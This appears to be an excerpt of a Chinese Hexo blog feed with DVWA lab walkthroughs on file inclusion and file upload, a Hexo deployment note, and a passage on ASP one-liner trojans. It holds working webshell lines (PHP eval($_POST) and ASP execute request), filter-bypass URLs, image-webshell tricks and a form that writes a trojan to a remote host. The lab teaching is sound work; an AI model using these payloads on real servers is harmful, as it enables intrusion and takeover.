中的值的值。<br>string<br>必需。规定被搜索的字符串。<br>count<br>可选。对替换数进行计数的变量。</p><p>从源码中可以看到http://、https://、../、..\会被替换为空字符，可以用双写绕过。同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的，采用绝对路径的办法不受影响。所以我们的语句也与上面基本相同，只是在被替换的地方双写一下即可</p><h4 id="实战：-1"><a href="#实战：-1" class="headerlink" title="实战："></a>实战：</h4><p>本地包含：low级别的url在medium级别仍旧可以用。</p><p>远程包含：我把1.php传到服务器的root目录底下，因此url改为</p><p><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=htthttp://p://121.199.51.153/root/1.php</code></p><p>出错提示：</p><p><strong>Warning</strong>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p> <strong>Warning</strong>:  include(<a href="http://121.199.51.153/root/1.php" target="_blank" rel="noopener">http://121.199.51.153/root/1.php</a>): failed to open stream: no suitable wrapper could be found in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p> <strong>Warning</strong>:  include(): Failed opening  ‘<a href="http://121.199.51.153/root/1.php&#39;" target="_blank" rel="noopener">http://121.199.51.153/root/1.php&#39;</a> for inclusion  (include_path=’.;C:\php\pear;../../external/phpids/0.6/lib/‘) in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p>尝试的法1：<a href="http://www.voidcn.com/article/p-ddodmxtt-buo.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ddodmxtt-buo.html</a></p><p>尝试的法2：想在远程服务器里编辑php.ini，结果报错</p><p>root@iZbp1342kjcxfvbybtm200Z:<del># find / -name php.ini<br>/etc/php/7.0/apache2/php.ini<br>/etc/php/7.0/cli/php.ini<br>root@iZbp1342kjcxfvbybtm200Z:</del># vim /etc/php5/cgi/php.ini<br>Error detected while processing /usr/share/vim/vimrc:<br>line   20:<br>E484: Can’t open file /usr/share/vim/vim81/syntax/syntax.vim</p><p>应该是vim的问题，彻底卸载重装vim：<a href="https://blog.csdn.net/violet_echo_0908/article/details/103311621还是会出现E484，进行多方查找无解，放弃" target="_blank" rel="noopener">https://blog.csdn.net/violet_echo_0908/article/details/103311621还是会出现E484，进行多方查找无解，放弃</a></p><p>尝试的法3：可能是Apache的问题，点击本地Apache的php.ini，发现allow_url_include=Off，修改成on，仍旧报错（<a href="https://blog.csdn.net/bfboys/article/details/52486016），偶然知道可能得重启（https://www.cnblogs.com/chenhuanBlogs/p/10348557.html），遂重启，确实不再报allow_url_include=0的错" target="_blank" rel="noopener">https://blog.csdn.net/bfboys/article/details/52486016），偶然知道可能得重启（https://www.cnblogs.com/chenhuanBlogs/p/10348557.html），遂重启，确实不再报allow_url_include=0的错</a></p><p>报错内容变为：</p><p><strong>Warning</strong>:  include(<a href="http://121.199.51.153/root/1.php" target="_blank" rel="noopener">http://121.199.51.153/root/1.php</a>): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p> <strong>Warning</strong>:  include(): Failed opening  ‘<a href="http://121.199.51.153/root/1.php&#39;" target="_blank" rel="noopener">http://121.199.51.153/root/1.php&#39;</a> for inclusion  (include_path=’.;C:\php\pear;../../external/phpids/0.6/lib/‘) in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p><p>意思应该为路径错误，才想到自己根本就没把1.php放在根目录下，把1.php放到根目录下边，然后url改为<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=htthttp://p://121.199.51.153/1.php</code> 成功包含。</p><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation文件如果不是include.php就得是file开头的文件if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt; </code></pre><p>代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>fnmatch(pattern,string,flags)函数根据指定的模式来匹配文件名或字符串。<br>pattern<br>必需。规定要检索的模式。<br>string<br>必需。规定要检查的字符串或文件。<br>flags<br>可选。</p><p>我们可以利用file协议绕过防护策略。当我们用浏览器打开一个本地文件时，用的就是file协议。（file-本地传输协议 主要用于访问本地计算机中的文件）<br>file:///path 这个可以直接访问文件(file://也行)</p><h4 id="实战：-2"><a href="#实战：-2" class="headerlink" title="实战："></a>实战：</h4><p>输入<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file:///F:\1.php</code></p><p>file后边是路径，成功包含。</p><p>（备注：至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件(需要知道上传文件的绝对路径),从而实现任意命令执行。）</p><h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Only allow include.php or file{1..3}.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exiphpt;}?&gt; </code></pre><p>代码直接限制了page的参数，没法再攻击。</p><p>参考链接：<a href="https://www.cnblogs.com/yyxianren/p/11381111.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyxianren/p/11381111.html</a></p><p><a href="https://www.cnblogs.com/Loong716/p/10391324.html" target="_blank" rel="noopener">https://www.cnblogs.com/Loong716/p/10391324.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Dvwa-文件包含漏洞（File-Inclusion）&quot;&gt;&lt;a href=&quot;#Dvwa-文件包含漏洞（File-Inclusion）&quot; class=&quot;headerlink&quot; title=&quot;Dvwa 文件包含漏洞（File Inclusion）&quot;&gt;&lt;/a&gt;Dvwa 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>发博客的一点记录</title>
    <link href="http://yoursite.com/2020/05/14/%E5%8F%91%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/05/14/%E5%8F%91%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-14T13:41:35.270Z</published>
    <updated>2020-07-07T05:10:12.735Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo写博客的一点记录"><a href="#Hexo写博客的一点记录" class="headerlink" title="Hexo写博客的一点记录"></a>Hexo写博客的一点记录</h1><p>1.用Typora编写博客</p><p>2.存到 \ source\ _posts 底下，空白处右键Git Bash Here</p><p>3.输入</p><p><strong>hexo clean</strong> :  清除缓存文件 db.json 和已生成的静态文件 public 。</p><p>备注：网站显示异常时可以执行这条命令试试。</p><p><strong>hexo g</strong> :  生成网站静态文件到默认设置的 public 文件夹。</p><p>备注：</p><p>1）便于查看网站生成的静态文件或者手动部署网站；</p><p>2）如果使用自动部署，不需要先执行该命令；</p><p>3）hexo g 是 hexo generate 的缩写，命令效果一致。</p><p>4）简单来说，这一步是为了预览，你可以在localhost：4000查看</p><p><strong>hexo d</strong>：自动生成网站静态文件，并部署到设定的仓库。</p><p>（备注：hexo d 是 hexo deploy 的缩写，命令效果一致。）</p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>部署过程中第一次弹出的小框是写登录git的用户名（或者邮箱名）与密码，如果登陆失败，会出现…failed…让你Crtl+C退出；成功的话，下面有个大约长两cm宽0.5cm的长方形阴影。</p><p>然后第二次弹出的长条小方框Openssh，第一次要填登录git的邮箱，第二次password要填personal access token！</p><p>（git账号头像旁边的倒三角-&gt;settings-&gt;Developer settings-&gt;Personal access tokens）</p><p>Personal access tokens页面下面有可点击的链接点进去，进入Edit personal access token页面，点击下边红字Regenerate token即可生成token，复制填入。</p><p>部署成功。</p><p>创建token的官网链接：<a href="https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line" target="_blank" rel="noopener">https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo写博客的一点记录&quot;&gt;&lt;a href=&quot;#Hexo写博客的一点记录&quot; class=&quot;headerlink&quot; title=&quot;Hexo写博客的一点记录&quot;&gt;&lt;/a&gt;Hexo写博客的一点记录&lt;/h1&gt;&lt;p&gt;1.用Typora编写博客&lt;/p&gt;
&lt;p&gt;2.存到 \ so
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DVWA File Upload</title>
    <link href="http://yoursite.com/2020/05/14/DVWA%20File%20Upload/"/>
    <id>http://yoursite.com/2020/05/14/DVWA%20File%20Upload/</id>
    <published>2020-05-14T12:39:06.226Z</published>
    <updated>2020-05-14T13:59:38.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-File-Upload"><a href="#DVWA-File-Upload" class="headerlink" title="DVWA File Upload"></a>DVWA File Upload</h1><p>File Upload，即文件上传。文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。</p><p>这是文件上传漏洞很全的一个总结 参考链接：<a href="https://www.cnblogs.com/0daybug/p/12311087.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/12311087.html</a></p><p>webshell概念：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p><p><a href="https://www.jianshu.com/p/02aac12e459f" target="_blank" rel="noopener">参考博客</a></p><p>常规的文件上传操作：<br>客户端上传：</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;文件上传操作&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;    头像：&lt;input type=&quot;file&quot; name=&quot;img&quot;&gt;&lt;br /&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在HTML <form>标签中enctype属性规定在发送到服务器之前应该如何对表单数据进行编码。</form></p><p>它的值有三种：</p><pre><code>application/x-www-form-urlencoded: 在发送前编码所有字符（默认）multipart/form-data: 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。text/plain: 空格转换为 &quot;+&quot; 加号，但不对特殊字符编码。</code></pre><p>服务端接收：</p><p>使用$_FILES数组接收参数。</p><p>我们打印$_FILES</p><pre><code>print_r($_FILES);</code></pre><p>发现上传一个文件时的属性有：</p><pre><code>[name] =&gt; feng.jpeg     文件的名称[type] =&gt; image/jpeg     文件的MIME类型[tmp_name] =&gt; C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置[error] =&gt; 0       文件的错误信息  0 ok      1234 error[size] =&gt; 2859    文件的大小</code></pre><p>文件上传漏洞的利用的条件：<br>1.能够成功上传木马文件<br>2.上传文件必须能够被执行<br>3.上传文件的路径必须可知</p><p><a href="https://www.cnblogs.com/yyxianren/p/11381655.html" target="_blank" rel="noopener">参考博客</a></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>源码：</strong></p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to? //isset() 函数用于检测变量是否已设置并且非 NULL。    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); //这段代码是有关文件上传之后的位置的。basename(path,suffix)：path必需。规定要检查的路径。在Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。suffix:可选。规定文件扩展名。如果文件有suffix，则不会输出这个扩展名。    // Can we move the file to the upload folder? 能否可以上传？    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // 判断是否可以上传。move_uploaded_file(file,newloc)：file必需，规定要移动的文件。newloc必需，规定文件的新位置。//move_uploaded_file函数将上传的文件移动到新位置。        // No 即失败        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {         // Yes! 即成功        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;         //返回文件路径    } } ?&gt; </code></pre><p> move_uploaded_file 函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p><p>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p><p><strong>实战：</strong></p><p>1.这段代码对于上传文件的类型、内容等没有进行任何的过滤检查，直接将文件存储在 “hackable/uploads/“ 路径下。因此我们可以直接上传一个一句话木马文件进行攻击。<br><?php @eval($_POST['1']);?> （php一句话木马）</p><p>上传后出现：../../hackable/uploads/1.php succesfully uploaded!</p><p>浏览器访问（即输入url：127.0.0.1/DVWA-master/hackable/uploads/1.php）确定是否上传成功</p><p>上传成功即可进行下一步。</p><p>2.<a href="https://www.freesion.com/article/6380373568/#22_DVWAhackphp_28" target="_blank" rel="noopener">参考博客</a></p><p>打开中国蚁剑，右键添加数据：URL地址填127.0.0.1/DVWA-master/hackable/uploads/1.php；连接密码写1（因为第一步写的一句话木马post提交的是1）；编码器选chr；点击添加。右键文件管理能看到列表即连接成功。</p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>源码：</strong></p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information 文件信息（上传的文件）    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     // Is it an image? 判断上传的文件是不是图片（是jpeg和png图片且大小小于100000字节）    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) ) {         // Can we move the file to the upload folder?我们能否上传文件？         if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         else {             // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;             //还是一样会显示路径        }     }     else { //下边是：如果上传的文件不是图片返回的信息        // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } ?&gt; </code></pre><p>多了需要上传图片的条件</p><p><strong>实战：</strong>同样写<?php @eval($_POST['1']);?>,存成2.jpg，上传，用burpsuite拦截把jpg再改成php,打开蚁剑发现文件目录出现了2.jpg跟2.php。<a href="https://www.cnblogs.com/hyq0616-love/p/12661187.html" target="_blank" rel="noopener">参考博客</a></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p>源码：</p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information 文件信息    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //这句的意思是将文件的后缀名赋给$uploaded_ext。    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; //strrpos函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）；substr函数返回字符串的一部分。//strrpos(string,find,start):string必需。规定被搜索的字符串。find必需。规定要查找的字符.start可选。规定在何处开始搜索。    // Is it an image? 判断图片    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) { //strtolower函数将所有字符转换为小写；getimagesize函数用于获取图像的大小及相关信息。        // Can we move the file to the upload folder? 同上        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         else {             // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;         }     }     else {         // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } ?&gt; </code></pre><p><strong>实战：</strong></p><p>不是对类型做限制，而是对后缀做了白名单限制。并且对图像内容做了检测。上传图片码解决</p><p>1.制作图片马,命令行终端执行。（将代码和图片合为一体）</p><pre><code>copy 1.jpg/b+3.php/a hack.jpg</code></pre><p>2.或者直接bp抓包，修改内容，加上图片头GIF89a</p><ol><li><p>上传1.jpg的木马文件，抓包</p></li><li><p>加上GIF89a的图片头，让其误以为内容是图片</p><p><img src="https://img2020.cnblogs.com/blog/1962254/202005/1962254-20200503155942090-75242379.png" alt="img"></p><p><a href="https://www.cnblogs.com/kbhome/p/12822233.html" target="_blank" rel="noopener">参考博客</a></p></li></ol><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p>源码：</p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Check Anti-CSRF token 意为校验token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //返回上传的文件名.后面的字符，即文件类型    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Where are we going to be writing to?     $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;     //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;     $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;     $temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );     $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; //这边是重写文件名（在文件名前面加id再整体md5）//将上传的文件进行改名以及确定上传的目录位置。uniqid函数基于以微秒计的当前时间，生成一个唯一的 ID；ini_get函数用于获取一个配置选项的值或者说获取php.ini里的环境变量的值 。sys_get_temp_dir函数用于返回用于临时文件的目录。    // Is it an image? 仍旧限制了条件    if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) {         // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 下边是将上传的图片重新编码        if( $uploaded_type == &#39;image/jpeg&#39; ) {             $img = imagecreatefromjpeg( $uploaded_tmp );             imagejpeg( $img, $temp_file, 100); //imagejpeg ( image , filename , quality)//从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。        }         else {             $img = imagecreatefrompng( $uploaded_tmp );             imagepng( $img, $temp_file, 9);         }         imagedestroy( $img );//imagedestroy函数销毁图像资源 //imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回false        // Can we move the file to the web root from the temp folder? 意为是否可以将文件从临时目录转移到web根目录。//rename函数重命名文件或目录；getcwd函数用于获取当前的工作目录；        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {             // Yes!             echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;         }         else {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         // Delete any temp files 意为删除所有临时文件。        if( file_exists( $temp_file ) )//file_exists函数用于检查文件或目录是否存在。             unlink( $temp_file ); //unlink函数用于删除文件。    }     else {         // Invalid file 上传的文件不符合规则        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } // Generate Anti-CSRF token generateSessionToken(); //生成token?&gt; </code></pre><p>函数学习：</p><p>substr(string,start,length)<br>函数返回字符串的一部分</p><p>strrpos(string,find,start)<br>函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>uniqid(prefix,more_entropy)：prefix可选，为 ID 规定前缀。如果两个脚本恰好在相同的微秒生成 ID，该参数很有用；more_entropy可选，规定位于返回值末尾的更多的熵。</p><p>ini_get( string $varname )：varname必需，配置选项名称。</p><p>ini_get拓展概念：成功是返回配置选项值的字符串，null 的值则返回空字符串。如果配置选项不存在，将会返回 FALSE。<br>注意: 当查询一个 boolean 值 ，一个 off 的 boolean ini 值将会以空字符串或者 “0” 返回；on 的 ini 值会以 “1” 返回。 此函数也会返回 INI 值的文字字符串。<br>注意: 当查询一个内存尺寸的值，许多内存尺寸的 ini 值，类似 upload_max_filesize 是以简写表示法储存在 php.ini 文件里。 ini_get() 会返回 php.ini 文件中储存的确切字符串，而不是它的等量 integer。尝试对这些值使用常规算术运算函数将不会得到预期的结果。 以上例子显示了转换简写表示法为字节的一种方式，和 PHP 源码所做的比较像。<br>注意: ini_get() 无法读取 “array” 的 ini 选项，例如 pdo.dsn.*，在这个例子中会返回 FALSE 。 </p><p>getimagesize()<br>函数用来获取图像的大小和类型<br>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><p>扩展：</p><p>源码中使用了一个非常不安全的的函数：<strong>getimagesize()</strong></p><p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</p><p>getimagesize()返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。因为图片头可以被伪造，我们完全可以通过伪造正确的图片头来绕过它对图片类型的检查。</p><p>这就是图片的十六进制，前几位都是一样的</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143107947-1812469690.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143459251-1601347052.png" alt="img"></p><p>按照这样的逻辑，我们就可以去伪造一个假图片，让函数以为我们这就是图片，达到绕过的目的。</p><ul><li>方法1 直接伪造头部GIF89A</li><li>方法2 CMD：copy /b test.png+munma.php hack.png</li><li>方法3 使用GIMP（开源的图片修改软件），通过增加备注，写入执行命令。</li></ul><p>但是，即使我们可以根据上述方法绕过函数getimagesize()，我们也绕不过imagecreatefromjpeg ( filename )、imagejpeg ( image , filename , quality)、imagedestroy( img )等几个函数对我们上传图片的重塑。所以，Impossible等级的代码是比较安全的。<a href="https://blog.csdn.net/weixin_43915842/article/details/90183305" target="_blank" rel="noopener">参考博客1</a>   <a href="https://www.cnblogs.com/zhengna/p/12764718.html" target="_blank" rel="noopener">参考博客2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-File-Upload&quot;&gt;&lt;a href=&quot;#DVWA-File-Upload&quot; class=&quot;headerlink&quot; title=&quot;DVWA File Upload&quot;&gt;&lt;/a&gt;DVWA File Upload&lt;/h1&gt;&lt;p&gt;File Upload，即文
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>一句话木马的原理及利用</title>
    <link href="http://yoursite.com/2020/05/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/05/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</id>
    <published>2020-05-14T12:38:58.625Z</published>
    <updated>2020-05-13T07:19:39.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一句话木马的原理及利用"><a href="#一句话木马的原理及利用" class="headerlink" title="一句话木马的原理及利用"></a>一句话木马的原理及利用</h1><h3 id="一句话木马的举例说明："><a href="#一句话木马的举例说明：" class="headerlink" title="一句话木马的举例说明："></a>一句话木马的举例说明：</h3><p>黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>&lt;%execute request(“value”)%&gt;<br>其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>&lt;%eval request(“value”)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(“value”)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>这就被称为一句话木马，它是基于B/S结构的。</p><h3 id="一句话木马的工作原理："><a href="#一句话木马的工作原理：" class="headerlink" title="一句话木马的工作原理："></a>一句话木马的工作原理：</h3><p>“一句话木马”服务端（本地的html提交文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为   &lt;%execute request(“value”)%&gt;   其中value可以自己修改</p><p>“一句话木马”客户端（远程服务器上被插入一句话的asp文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件</p><p>现在先假设在远程主机的TEXT.ASP(客户端）中已经有了&lt;%execute request(“value”)%&gt;这个语句.)在ASP里&lt;%execute …………”)%&gt;意思是执行省略号里的语句.那么如果我写进我们精心构造的语句,它也是会帮我们执行的.就按照这上面的思路,我们就可以在本地构造一个表单内容如下:(//为注释)</p><pre><code>&lt;form action=http://主机路径/TEXT.asp method=post&gt;&lt;textarea name=value cols=120 rows=10 width=45&gt;set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象lP.Open //打开lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;newvalue&quot;)lP.SaveToFile server.mappath(&quot;newmm.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式lP.Close //关闭对象set lP=nothing //释放对象response.redirect &quot;newmm.asp&quot; //转向newmm.asp&lt;/textarea&gt;&lt;textarea name=newvalue cols=120 rows=10 width=45&gt;添入生成木马的内容&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br&gt;&lt;input type=submit value=提交&gt;&lt;/form&gt;</code></pre><p>表单的作用就是把我们表单里的内容提交到远程主机的TEXT.ASP这个文件.然后因为TEXT.ASP里有&lt;%execute 